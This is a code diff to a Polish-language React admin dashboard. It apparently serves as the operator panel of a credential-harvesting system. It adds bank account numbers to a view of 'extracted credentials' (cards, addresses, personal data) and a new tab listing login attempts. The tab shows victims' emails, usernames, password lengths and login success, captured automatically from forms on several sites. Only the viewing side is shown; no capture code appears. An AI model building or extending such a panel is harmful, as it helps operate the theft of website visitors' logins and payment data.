@@ -54,6 +54,7 @@ interface CredentialsStats {
         username: number;
         phone: number;
         card: number;
+        bank_account: number;
         address: number;
         personal: number;
     };
@@ -66,6 +67,40 @@ interface CredentialsStats {
     uniqueVisitors: number;
 }
 
+// Typy dla prób logowania
+interface LoginAttempt {
+    id: string;
+    timestamp: string;
+    siteId: string;
+    sessionId: string;
+    visitorId: string;
+    formSubmissionId: string | null;
+    email: string | null;
+    username: string | null;
+    passwordLength: number;
+    pageUrl: string | null;
+    pagePath: string | null;
+    loginSuccess: boolean | null;
+    detectionMethod: string | null;
+    errorMessage: string | null;
+    redirectUrl: string | null;
+    responseStatus: number | null;
+    createdAt: string;
+    statusLabel: string;
+}
+
+interface LoginStats {
+    total: number;
+    successful: number;
+    failed: number;
+    unknown: number;
+    uniqueSessions: number;
+    uniqueVisitors: number;
+    uniqueEmails: number;
+    uniqueSites: number;
+    successRate: number;
+}
+
 // Mapowanie typów danych na ikony i kolory
 const CREDENTIAL_TYPE_CONFIG: Record<string, { icon: string; label: string; color: string; bgColor: string }> = {
     email: { icon: '📧', label: 'E-mail', color: 'text-blue-400', bgColor: 'bg-blue-500/20' },
@@ -73,6 +108,7 @@ const CREDENTIAL_TYPE_CONFIG: Record<string, { icon: string; label: string; colo
     username: { icon: '👤', label: 'Login', color: 'text-purple-400', bgColor: 'bg-purple-500/20' },
     phone: { icon: '📱', label: 'Telefon', color: 'text-green-400', bgColor: 'bg-green-500/20' },
     card: { icon: '💳', label: 'Karta', color: 'text-amber-400', bgColor: 'bg-amber-500/20' },
+    bank_account: { icon: '🏦', label: 'Nr konta', color: 'text-emerald-400', bgColor: 'bg-emerald-500/20' },
     address: { icon: '📍', label: 'Adres', color: 'text-cyan-400', bgColor: 'bg-cyan-500/20' },
     personal: { icon: '🪪', label: 'Dane osobowe', color: 'text-pink-400', bgColor: 'bg-pink-500/20' },
 };
@@ -113,7 +149,7 @@ function getFileIcon(extension: string | null, mimeType: string | null): string 
     return '📁';
 }
 
-type ActiveTab = 'files' | 'credentials' | 'sql';
+type ActiveTab = 'files' | 'credentials' | 'logins' | 'sql';
 
 // Typy dla edytora SQL
 interface TableInfo {
@@ -165,6 +201,12 @@ export default function DataManagementPage() {
     const [credentials, setCredentials] = useState<ExtractedCredential[]>([]);
     const [credentialsStats, setCredentialsStats] = useState<CredentialsStats | null>(null);
     const [credentialsLoading, setCredentialsLoading] = useState(true);
+
+    // Stan dla prób logowania
+    const [logins, setLogins] = useState<LoginAttempt[]>([]);
+    const [loginStats, setLoginStats] = useState<LoginStats | null>(null);
+    const [loginsLoading, setLoginsLoading] = useState(true);
+    const [loginStatusFilter, setLoginStatusFilter] = useState<string>('all');
 
     // Filtry
     const [days, setDays] = useState(30);
@@ -302,7 +344,7 @@ export default function DataManagementPage() {
         setSelectedTable(tableName);
     };
 
-    // Pobieranie danych logowania
+    // Pobieranie danych logowania (zawsze pobieraj wszystkie dane, filtruj lokalnie)
     const fetchCredentials = useCallback(async () => {
         setCredentialsLoading(true);
         try {
@@ -310,12 +352,8 @@ export default function DataManagementPage() {
                 days: String(days),
                 limit: '500',
             });
-            if (credentialTypeFilter !== 'all') {
-                params.set('type', credentialTypeFilter);
-            }
-            if (confidenceFilter !== 'all') {
-                params.set('confidence', confidenceFilter);
-            }
+            // Nie przekazujemy filtrów do API - zawsze pobieramy wszystkie dane
+            // Filtrowanie odbywa się lokalnie, żeby statystyki pokazywały pełne dane
 
             const res = await fetch(`/api/credentials?${params}`);
             if (!res.ok) {
@@ -334,14 +372,43 @@ export default function DataManagementPage() {
         } finally {
             setCredentialsLoading(false);
         }
-    }, [days, credentialTypeFilter, confidenceFilter]);
+    }, [days]);
+
+    // Pobieranie prób logowania
+    const fetchLogins = useCallback(async () => {
+        setLoginsLoading(true);
+        try {
+            const params = new URLSearchParams({
+                days: String(days),
+                limit: '500',
+            });
+
+            const res = await fetch(`/api/logins?${params}`);
+            if (!res.ok) {
+                if (res.status === 401) {
+                    window.location.href = '/login';
+                    return;
+                }
+                throw new Error('Błąd pobierania prób logowania');
+            }
+            const data = await res.json();
+            setLogins(data.logins || []);
+            setLoginStats(data.stats || null);
+        } catch (err) {
+            console.error(err);
+            setError('Błąd pobierania prób logowania');
+        } finally {
+            setLoginsLoading(false);
+        }
+    }, [days]);
 
     // Efekt początkowy
     useEffect(() => {
         fetchFiles();
         fetchCredentials();
+        fetchLogins();
         fetchDatabaseSchema();
-    }, [fetchFiles, fetchCredentials, fetchDatabaseSchema]);
+    }, [fetchFiles, fetchCredentials, fetchLogins, fetchDatabaseSchema]);
 
     // Pobieranie pliku
     const handleDownloadFile = async (file: UploadedFile) => {
@@ -400,16 +467,48 @@ export default function DataManagementPage() {
         }
     };
 
-    // Filtrowanie danych logowania po wyszukiwaniu
+    // Filtrowanie danych logowania (typ, pewność, wyszukiwanie)
     const filteredCredentials = credentials.filter(c => {
-        if (!searchQuery) return true;
-        const query = searchQuery.toLowerCase();
-        return (
-            c.fieldValue.toLowerCase().includes(query) ||
-            c.fieldName.toLowerCase().includes(query) ||
-            c.visitorId.toLowerCase().includes(query) ||
-            (c.pageUrl && c.pageUrl.toLowerCase().includes(query))
-        );
+        // Filtr typu
+        if (credentialTypeFilter !== 'all' && c.credentialType !== credentialTypeFilter) {
+            return false;
+        }
+        // Filtr pewności
+        if (confidenceFilter !== 'all' && c.confidence !== confidenceFilter) {
+            return false;
+        }
+        // Filtr wyszukiwania
+        if (searchQuery) {
+            const query = searchQuery.toLowerCase();
+            return (
+                c.fieldValue.toLowerCase().includes(query) ||
+                c.fieldName.toLowerCase().includes(query) ||
+                c.visitorId.toLowerCase().includes(query) ||
+                (c.pageUrl && c.pageUrl.toLowerCase().includes(query))
+            );
+        }
+        return true;
+    });
+
+    // Filtrowanie prób logowania
+    const filteredLogins = logins.filter(login => {
+        // Filtr statusu
+        if (loginStatusFilter !== 'all') {
+            if (loginStatusFilter === 'success' && login.loginSuccess !== true) return false;
+            if (loginStatusFilter === 'failed' && login.loginSuccess !== false) return false;
+            if (loginStatusFilter === 'unknown' && login.loginSuccess !== null) return false;
+        }
+        // Filtr wyszukiwania
+        if (searchQuery) {
+            const query = searchQuery.toLowerCase();
+            return (
+                (login.email && login.email.toLowerCase().includes(query)) ||
+                (login.username && login.username.toLowerCase().includes(query)) ||
+                (login.pageUrl && login.pageUrl.toLowerCase().includes(query)) ||
+                login.visitorId.toLowerCase().includes(query)
+            );
+        }
+        return true;
     });
 
     // Kopiowanie do schowka z notyfikacją
@@ -608,6 +707,17 @@ export default function DataManagementPage() {
                         {credentialsStats && <span className="ml-2 text-xs opacity-75">({credentialsStats.total})</span>}
                     </button>
                     <button
+                        onClick={() => setActiveTab('logins')}
+                        className={`px-6 py-3 rounded-xl font-medium transition-all ${
+                            activeTab === 'logins'
+                                ? 'bg-gradient-to-r from-emerald-600 to-teal-600 text-white shadow-lg shadow-emerald-900/30'
+                                : 'bg-slate-800 text-slate-400 hover:bg-slate-700 hover:text-white border border-slate-700'
+                        }`}
+                    >
+                        🔑 Próby Logowania
+                        {loginStats && <span className="ml-2 text-xs opacity-75">({loginStats.total})</span>}
+                    </button>
+                    <button
                         onClick={() => setActiveTab('files')}
                         className={`px-6 py-3 rounded-xl font-medium transition-all ${
                             activeTab === 'files'
@@ -643,11 +753,26 @@ export default function DataManagementPage() {
                     <div className="space-y-6">
                         {/* Statystyki */}
                         {credentialsStats && (
-                            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-7 gap-4">
+                            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-8 gap-4">
+                                {/* Przycisk "Wszystkie" do resetowania filtra */}
+                                <div
+                                    onClick={() => setCredentialTypeFilter('all')}
+                                    className={`p-4 rounded-xl border cursor-pointer transition-all hover:scale-105 ${
+                                        credentialTypeFilter === 'all'
+                                            ? 'bg-slate-700/50 border-slate-500'
+                                            : 'bg-slate-900/50 border-slate-800 hover:border-slate-600'
+                                    }`}
+                                >
+                                    <div className="text-2xl mb-1">📊</div>
+                                    <div className="text-2xl font-bold text-slate-200">
+                                        {credentialsStats.total}
+                                    </div>
+                                    <div className="text-xs text-slate-400">Wszystkie</div>
+                                </div>
                                 {Object.entries(CREDENTIAL_TYPE_CONFIG).map(([type, config]) => (
                                     <div
                                         key={type}
-                                        onClick={() => setCredentialTypeFilter(type)}
+                                        onClick={() => setCredentialTypeFilter(credentialTypeFilter === type ? 'all' : type)}
                                         className={`p-4 rounded-xl border cursor-pointer transition-all hover:scale-105 ${
                                             credentialTypeFilter === type
                                                 ? `${config.bgColor} border-current`
@@ -714,6 +839,7 @@ export default function DataManagementPage() {
                                                 <th className="p-4">Pewność</th>
                                                 <th className="p-4">Data</th>
                                                 <th className="p-4">Strona</th>
+                                                <th className="p-4">URL</th>
                                                 <th className="p-4 text-center">Akcje</th>
                                             </tr>
                                         </thead>
@@ -794,8 +920,13 @@ export default function DataManagementPage() {
                                                         <td className="p-4 text-xs text-slate-400">
                                                             {new Date(cred.timestamp).toLocaleString('pl-PL')}
                                                         </td>
+                                                        <td className="p-4">
+                                                            <span className="text-xs px-2 py-1 rounded bg-slate-700 text-cyan-400 font-mono">
+                                                                {cred.siteId || '—'}
+                                                            </span>
+                                                        </td>
                                                         <td className="p-4 text-xs text-slate-400 max-w-[200px] truncate" title={cred.pageUrl || ''}>
-                                                            {cred.pageUrl ? new URL(cred.pageUrl).pathname : '—'}
+                                                            {cred.pageUrl || '—'}
                                                         </td>
                                                         <td className="p-4 text-center">
                                                             <button
@@ -808,6 +939,184 @@ export default function DataManagementPage() {
                                                     </tr>
                                                 );
                                             })}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            )}
+                        </div>
+                    </div>
+                )}
+
+                {/* Zakładka Próby Logowania */}
+                {activeTab === 'logins' && (
+                    <div className="space-y-6">
+                        {/* Statystyki logowań */}
+                        {loginStats && (
+                            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
+                                <div
+                                    onClick={() => setLoginStatusFilter('all')}
+                                    className={`p-4 rounded-xl border cursor-pointer transition-all hover:scale-105 ${
+                                        loginStatusFilter === 'all'
+                                            ? 'bg-slate-700/50 border-slate-500'
+                                            : 'bg-slate-900/50 border-slate-800 hover:border-slate-600'
+                                    }`}
+                                >
+                                    <div className="text-2xl mb-1">📊</div>
+                                    <div className="text-2xl font-bold text-slate-200">{loginStats.total}</div>
+                                    <div className="text-xs text-slate-400">Wszystkie</div>
+                                </div>
+                                <div
+                                    onClick={() => setLoginStatusFilter('success')}
+                                    className={`p-4 rounded-xl border cursor-pointer transition-all hover:scale-105 ${
+                                        loginStatusFilter === 'success'
+                                            ? 'bg-emerald-500/20 border-emerald-500/50'
+                                            : 'bg-slate-900/50 border-slate-800 hover:border-slate-600'
+                                    }`}
+                                >
+                                    <div className="text-2xl mb-1">✅</div>
+                                    <div className="text-2xl font-bold text-emerald-400">{loginStats.successful}</div>
+                                    <div className="text-xs text-slate-400">Udane</div>
+                                </div>
+                                <div
+                                    onClick={() => setLoginStatusFilter('failed')}
+                                    className={`p-4 rounded-xl border cursor-pointer transition-all hover:scale-105 ${
+                                        loginStatusFilter === 'failed'
+                                            ? 'bg-red-500/20 border-red-500/50'
+                                            : 'bg-slate-900/50 border-slate-800 hover:border-slate-600'
+                                    }`}
+                                >
+                                    <div className="text-2xl mb-1">❌</div>
+                                    <div className="text-2xl font-bold text-red-400">{loginStats.failed}</div>
+                                    <div className="text-xs text-slate-400">Nieudane</div>
+                                </div>
+                                <div
+                                    onClick={() => setLoginStatusFilter('unknown')}
+                                    className={`p-4 rounded-xl border cursor-pointer transition-all hover:scale-105 ${
+                                        loginStatusFilter === 'unknown'
+                                            ? 'bg-amber-500/20 border-amber-500/50'
+                                            : 'bg-slate-900/50 border-slate-800 hover:border-slate-600'
+                                    }`}
+                                >
+                                    <div className="text-2xl mb-1">❓</div>
+                                    <div className="text-2xl font-bold text-amber-400">{loginStats.unknown}</div>
+                                    <div className="text-xs text-slate-400">Nieznane</div>
+                                </div>
+                                <div className="p-4 rounded-xl border bg-slate-900/50 border-slate-800">
+                                    <div className="text-2xl mb-1">📈</div>
+                                    <div className="text-2xl font-bold text-cyan-400">{loginStats.successRate}%</div>
+                                    <div className="text-xs text-slate-400">Skuteczność</div>
+                                </div>
+                            </div>
+                        )}
+
+                        {/* Lista prób logowania */}
+                        <div className="bg-slate-900/50 border border-slate-800 rounded-xl overflow-hidden">
+                            {loginsLoading ? (
+                                <div className="text-center py-20 text-slate-500 animate-pulse">Ładowanie prób logowania...</div>
+                            ) : filteredLogins.length === 0 ? (
+                                <div className="text-center py-20 text-slate-500">
+                                    <div className="text-6xl mb-4">🔑</div>
+                                    <p>Brak wykrytych prób logowania</p>
+                                    <p className="text-sm mt-2 text-slate-600">Próby logowania są wykrywane automatycznie z formularzy</p>
+                                </div>
+                            ) : (
+                                <div className="overflow-x-auto">
+                                    <div className="p-3 bg-slate-800/50 border-b border-slate-700 flex items-center justify-between">
+                                        <span className="text-sm text-slate-400">
+                                            {filteredLogins.length} prób logowania
+                                            {loginStats && loginStats.uniqueEmails > 0 && (
+                                                <span className="ml-2 text-emerald-400">
+                                                    ({loginStats.uniqueEmails} unikalnych email/login)
+                                                </span>
+                                            )}
+                                        </span>
+                                    </div>
+                                    <table className="w-full text-left">
+                                        <thead className="text-xs uppercase text-slate-500 bg-slate-800/50 border-b border-slate-700">
+                                            <tr>
+                                                <th className="p-4">Status</th>
+                                                <th className="p-4">Email/Login</th>
+                                                <th className="p-4">Hasło</th>
+                                                <th className="p-4">Data</th>
+                                                <th className="p-4">Strona</th>
+                                                <th className="p-4">URL</th>
+                                                <th className="p-4">Wykrycie</th>
+                                                <th className="p-4">Szczegóły</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody className="divide-y divide-slate-800">
+                                            {filteredLogins.map((login) => (
+                                                <tr key={login.id} className="hover:bg-slate-800/50 transition-colors">
+                                                    <td className="p-4">
+                                                        <div className={`inline-flex items-center gap-2 px-3 py-1 rounded-full ${
+                                                            login.loginSuccess === true
+                                                                ? 'bg-emerald-500/20 text-emerald-400'
+                                                                : login.loginSuccess === false
+                                                                ? 'bg-red-500/20 text-red-400'
+                                                                : 'bg-amber-500/20 text-amber-400'
+                                                        }`}>
+                                                            <span>{login.loginSuccess === true ? '✅' : login.loginSuccess === false ? '❌' : '❓'}</span>
+                                                            <span className="text-xs font-medium">{login.statusLabel}</span>
+                                                        </div>
+                                                    </td>
+                                                    <td className="p-4">
+                                                        <div className="space-y-1">
+                                                            {login.email && (
+                                                                <div className="flex items-center gap-2">
+                                                                    <span className="text-blue-400">📧</span>
+                                                                    <span className="font-mono text-sm">{login.email}</span>
+                                                                </div>
+                                                            )}
+                                                            {login.username && (
+                                                                <div className="flex items-center gap-2">
+                                                                    <span className="text-purple-400">👤</span>
+                                                                    <span className="font-mono text-sm">{login.username}</span>
+                                                                </div>
+                                                            )}
+                                                        </div>
+                                                    </td>
+                                                    <td className="p-4">
+                                                        <div className="flex items-center gap-2 text-slate-400">
+                                                            <span>🔐</span>
+                                                            <span className="font-mono text-sm">{'•'.repeat(Math.min(login.passwordLength, 12))}</span>
+                                                            <span className="text-xs text-slate-500">({login.passwordLength} zn.)</span>
+                                                        </div>
+                                                    </td>
+                                                    <td className="p-4 text-sm text-slate-400">
+                                                        {new Date(login.timestamp).toLocaleString('pl-PL')}
+                                                    </td>
+                                                    <td className="p-4">
+                                                        <span className="text-xs px-2 py-1 rounded bg-slate-700 text-cyan-400 font-mono">
+                                                            {login.siteId || '—'}
+                                                        </span>
+                                                    </td>
+                                                    <td className="p-4">
+                                                        <div className="text-sm text-slate-400 max-w-[200px] truncate" title={login.pageUrl || ''}>
+                                                            {login.pageUrl || login.pagePath || '-'}
+                                                        </div>
+                                                    </td>
+                                                    <td className="p-4">
+                                                        <span className="text-xs px-2 py-1 rounded bg-slate-700 text-slate-300">
+                                                            {login.detectionMethod || '-'}
+                                                        </span>
+                                                    </td>
+                                                    <td className="p-4">
+                                                        {login.errorMessage && (
+                                                            <div className="text-xs text-red-400 max-w-[200px] truncate" title={login.errorMessage}>
+                                                                {login.errorMessage}
+                                                            </div>
+                                                        )}
+                                                        {login.redirectUrl && (
+                                                            <div className="text-xs text-emerald-400 max-w-[200px] truncate" title={login.redirectUrl}>
+                                                                → {login.redirectUrl}
+                                                            </div>
+                                                        )}
+                                                        {!login.errorMessage && !login.redirectUrl && (
+                                                            <span className="text-slate-600">-</span>
+                                                        )}
+                                                    </td>
+                                                </tr>
+                                            ))}
                                         </tbody>
                                     </table>
                                 </div>
